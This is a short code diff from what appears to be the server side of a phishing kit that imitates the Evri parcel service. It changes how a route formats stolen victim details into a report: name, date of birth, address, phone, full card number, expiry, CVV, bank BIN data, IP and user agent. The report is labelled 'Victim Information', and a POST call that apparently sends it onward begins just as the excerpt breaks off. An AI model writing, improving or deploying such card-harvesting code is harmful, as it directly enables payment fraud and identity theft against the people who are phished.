@@ -12413,7 +12413,7 @@ app.post("/haytchEvri", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalText = `-------------------------------------------------------------------------\nBilling Information\n|Full Name: ${fname}\n|DOB: ${dob}\n|Address: ${address}\n|Post Code: ${pcode}\n|Telephone: ${telephone}\n-------------------------------------------------------------------------\nCard Information\n|Card Number: ${ccnum}\n|Card Expiry: ${ccexp}\n|CVV: ${cvv}\n|Bin: ${binList}\n-------------------------------------------------------------------------\n+ Victim Information\n| IP Address : ${ip}\n| UserAgent : ${userAgent}`;
       if (aug25 == 1) {
         axios
           .post(
